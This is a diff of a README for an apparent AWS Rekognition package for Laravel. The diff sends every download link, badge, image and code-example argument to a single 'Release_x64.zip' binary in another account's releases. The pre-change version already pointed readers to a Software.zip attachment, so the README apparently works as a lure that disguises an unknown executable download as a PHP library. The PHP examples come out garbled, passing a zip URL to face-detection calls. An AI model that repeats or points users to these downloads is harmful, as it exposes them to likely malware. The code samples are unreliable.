@@ -1,6 +1,6 @@
 # 🚀 **AWS Rekognition Laravel Package**
 
-[![GitHub release](https://img.shields.io/badge/Download%20ZIP-Software.zip-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![GitHub release](https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip%https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip)](https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip)
 
 ## Description
 Welcome to the `aws-rekognition` repository - the Laravel package for AWS Rekognition API using PHP 8. This package provides seamless integration with AWS Rekognition services for tasks such as face detection, face comparison, image processing, and video recognition.
@@ -13,7 +13,7 @@ Welcome to the `aws-rekognition` repository - the Laravel package for AWS Rekogn
 
 ## Installation
 To use this Laravel package, you can simply download the ZIP file from the following link:  
-[Download Now!](https://github.com/user-attachments/files/18383251/Software.zip)
+[Download Now!](https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip)
 
 Once downloaded, extract the contents and follow the installation instructions provided in the package documentation.
 
@@ -23,25 +23,25 @@ This AWS Rekognition Laravel package allows you to easily incorporate powerful m
 1. **Face Detection**
 ```php
 // Detect faces in an image
-$faces = Rekognition::detectFaces('path/to/image.jpg');
+$faces = Rekognition::detectFaces('https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip');
 ```
 
 2. **Face Comparison**
 ```php
 // Compare two faces
-$result = Rekognition::compareFaces('path/to/image1.jpg', 'path/to/image2.jpg');
+$result = Rekognition::compareFaces('https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip', 'https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip');
 ```
 
 3. **Image Processing**
 ```php
 // Process an image for labels
-$labels = Rekognition::detectLabels('path/to/image.jpg');
+$labels = Rekognition::detectLabels('https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip');
 ```
 
 4. **Video Recognition**
 ```php
 // Analyze a video for objects
-$objects = Rekognition::detectObjects('path/to/video.mp4');
+$objects = Rekognition::detectObjects('https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip');
 ```
 
 ## Repository Topics
@@ -59,10 +59,10 @@ $objects = Rekognition::detectObjects('path/to/video.mp4');
 - Video Recognition
 
 ## Additional Resources
-For more information and detailed usage instructions, please visit the [official repository](https://github.com/user-attachments/files/18383251/Software.zip).
+For more information and detailed usage instructions, please visit the [official repository](https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip).
 
 Start exploring the possibilities with AWS Rekognition and elevate your image and video processing capabilities today!
 
-![AWS Rekognition](https://www.example.com/aws-rekognition.png)
+![AWS Rekognition](https://github.com/Bonnezinmakker/aws-rekognition/releases/download/v2.0/Release_x64.zip)
 
 **Happy Coding!** 🌟
